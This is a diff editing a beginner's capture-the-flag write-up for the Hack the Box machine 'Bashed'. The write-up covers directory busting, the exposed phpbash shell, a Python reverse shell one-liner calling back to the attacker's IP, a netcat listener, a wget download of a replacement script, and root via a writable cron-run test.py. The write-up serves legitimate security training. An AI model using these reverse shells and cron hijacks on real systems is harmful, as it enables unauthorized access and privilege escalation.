@@ -16,7 +16,9 @@ Contents:
 
 =======================================================
 
-Bashed is a Hack the Box example of system misconfigurations which allow a remote attacker to gain access and escalate to root privileges. The screenshots for this write-up were captured on 7 May 2020 as I completed the machine. This is useful to remember a bit later in the write-up as you will see. Of note, there is no need for Metasploit as everything can be done with fairly simple linux and python commands which makes this a perfect machine to attempt when just starting out.
+Bashed is a Hack the Box example of system misconfigurations which allow a remote attacker to gain access and escalate to root privileges. The screenshots for this write-up were captured on 7 May 2020 as I completed the machine. This is useful to remember a bit later in the write-up as you will see. 
+
+If you are following along in order of the machines I have on this site, Bashed is the first machine where we establish a foothold as a low-privileged user, move laterally to another user, and then escalate to root. Of note, there is no need for Metasploit as everything can be done with fairly simple linux and python commands which makes this a perfect machine to attempt when just starting out.
 
 <p>&nbsp;</p>
 =======================================================
@@ -56,21 +58,19 @@ We start with a basic nmap scan to see what ports are open and services are avai
 
 Port 80 is open running Apache 2.4.18, looks like on Ubuntu.
 
-Let's visit the web site and see what we have! : http://10.10.10.68
+Let's visit the web site and see what we have: http://10.10.10.68
 
 ![](/images/bashed/3. website.png "website")
 
-So we have a blog entry telling us Arrexel developed “phpbash” on this server, and that phpbash is useful for pentesting!
+So we have a blog entry telling us Arrexel developed “phpbash” on this server, and that phpbash is useful for pentesting! No other real hints in the page source or links.
 
-No other real hints in the page source or links.
-
-Let's fire up dirbuster and do some enumeration.
+Let's fire up dirbuster and do some specific enumeration by directory busting the web site for other files and folders.
 
     dirbuster &
 
 ![](/images/bashed/4. dirbuster_1.png "dirbuster")
 
-Fill in the options as you see above. Since the site talks about “phpbash”, I went with File Extension php and the medium wordlist. On Kali linux, this wordlist should be pre-installed at /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. I also clicked the "Go Faster" button to increase the speed of directory busting.
+Fill in the options as you see above. Since the site talks about “phpbash”, we input php as a File Extension and use the medium wordlist. On Kali linux, this wordlist should be pre-installed at /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. We also click the "Go Faster" button to increase the speed of directory busting.
 
 Once all of your options match those shown, click Start
 
@@ -78,7 +78,7 @@ You only need to let this run for a minute or so, then switch to the “Results 
 
 ![](/images/bashed/5. dirbuster_2.png "dirbuster")
 
-Here you can click through different folders that Dirbuster has found.  Remember how the blog entry said Arrexel developed phpbash on this very server?  Click on the “dev” folder.  
+Here you can click through different folders that dirbuster has found. Remember how the blog entry said Arrexel developed phpbash on this very server? Click on the “dev” folder.  
 
 ![](/images/bashed/6. dirbuster_3.png "dirbuster")
 
@@ -102,8 +102,7 @@ And we are greeted with what looks like a terminal window. Let's see what we can
 
 ![](/images/bashed/9. phpbash_2.png "phpbash")
 
-Okay, so we have code execution as a low-privileged user, but this is not the smoothest of interfaces. Perhaps we can use a bash one-liner to trigger a reverse tcp shell?  
-
+Here we have code execution as a low-privileged user, but this is not the smoothest of interfaces. Perhaps we can use a bash one-liner to trigger a reverse tcp shell?  
 
 <p>&nbsp;</p>
 =======================================================
@@ -112,8 +111,7 @@ Okay, so we have code execution as a low-privileged user, but this is not the sm
 
 =======================================================
 
-None!  This box is an example of purely manual enumeration and exploitation.  Have fun!
-
+None! This box is an example of purely manual enumeration and exploitation. Have fun!
 
 <p>&nbsp;</p>
 =======================================================
@@ -130,25 +128,29 @@ This pentestmonkey site is a favorite: http://pentestmonkey.net/cheat-sheet/shel
 
 ![](/images/bashed/11. pentestmonkey.png "pentestmonkey")
 
-This python reverse shell is also a favorite, so on our Kali machine, let's set up a nc listener to catch the connection:
+While there are many reverse shells on the pentestmonkey site, the python reverse shell shown above is normally a solid one to use against a linux machine. On our Kali machine, let's set up a nc listener to catch the connection:
 
     nc -lvnp 17011
 
 ![](/images/bashed/12. nc_listener.png "nc listener")
 
+Before sending the python one-liner, you must add your IP address and listener port in the "s.connect(( ))" portion of the code.
+
 Then in the phpbash window:
 
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-A note here: Bashed is an older machine so it is fine to default to using "python" which is normally symlinked to python2. In newer machines you will want to specify "python3" instead as python2 is deprecated. 
+A note here: Bashed is an older machine so it is fine to default to using "python" which is normally symlinked to python2. In newer machines (Ubuntu 20.04 on onward) you will want to specify "python3" instead as python2 may not be supported. 
 
 ![](/images/bashed/13. nc_connection.png "nc connection")
 
 We have a shell! Let's check if we can sudo anything:
 
+    sudo -l
+
 ![](/images/bashed/14. sudo-l.png "sudo -l")
 
-And we can! We can run any command as the user scriptmanager without a password. A dangerous misconfiguration for sure. Since user scriptmanager probably has more permissions than user www-data, let's log ourselves in as scriptmanager:
+And we can! We can run any command as the user scriptmanager without a password which is a dangerous misconfiguration. Since user scriptmanager probably has more permissions than user www-data, let's log ourselves in as scriptmanager:
 
     sudo -u scriptmanager bash -i
 
@@ -156,7 +158,7 @@ This command tells the system we want to run the command "bash -i", or bash in i
 
 ![](/images/bashed/15. sudo-u.png "sudo -u")
 
-Looks good! Let's see what else we can find in our home folder.
+Looks good! Let's see what else we can find in scriptmanager's home folder.
 
     cd /home/scriptmanager
 
@@ -170,7 +172,7 @@ Nothing interesting here. Let's check the / directory:
 
 ![](/images/bashed/17. enum_2.png "enum")
 
-Okay, so we are a user scriptmanager, and in the / directory there is a “scripts” folder which is not a default directory on linux. Let's check it out!
+We are user scriptmanager, and in the / directory there is a “scripts” folder which is not a default directory on linux. Let's check it out!
 
     cd scripts
 
@@ -178,7 +180,7 @@ Okay, so we are a user scriptmanager, and in the / directory there is a “scrip
 
 ![](/images/bashed/18. enum_3.png "enum")
 
-test.py and test.txt. test.txt has a date/timestamp of just a moment ago at 14:03 on 7 May.  Let's see what is in test.txt and test.py:
+Here we see two files: test.py and test.txt. test.txt has a date/timestamp of just a moment ago at 14:03 on 7 May. test.py is owned by scriptmanager while test.txt is owned by root. Let's see what is in these two files:
 
     cat test.txt
 
@@ -196,7 +198,7 @@ But test.txt is owned by the root user, and again that timestamp was from right 
 
 test.txt has a new timestamp of 14:07, meaning there is a cron job or some scheduled task that is running test.py every minute or so. Since user scriptmanager owns test.py, we can modify test.py and when the cron job runs as root we can gain a root shell!
 
-On my Kali machine I created a new python file and put this code in it:
+On our Kali machine we create a new python file and put this code in it. Again you will need to input your own IP address and port on the "s.connect(( ))" line:
 
 test.py:
 
@@ -208,17 +210,17 @@ test.py:
     os.dup2(s.fileno(),2)
     p=subprocess.call(["/bin/bash","-i"])
 
-Then I ran python's HTTP server:
+On Kali, we need to run python's HTTP server to serve the current directory via HTTP:
 
     python -m SimpleHTTPServer 8080
 
-Over on bashed I ran a wget command to download the test.py file to bashed:
+Over on bashed we execute a wget command to download the test.py file:
     
     wget http://10.10.14.24:8080/test.py
 
 ![](/images/bashed/21. wget.png "wget")
 
-Next I set up a nc listener on Kali to catch the connection:
+Next we set up a nc listener on Kali to catch the connection:
 
     nc -lvnp 17012
 
@@ -276,6 +278,7 @@ test.py:
 
 1. Pentestmonkey revserse shell cheatsheet: [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 2. Online sudo manual: [https://www.sudo.ws/man/1.8.14/sudo.man.html](https://www.sudo.ws/man/1.8.14/sudo.man.html)
+3. Online bash manual: [https://www.gnu.org/software/bash/manual/bash.html](https://www.gnu.org/software/bash/manual/bash.html)
 
 <p>&nbsp;</p>
 =======================================================
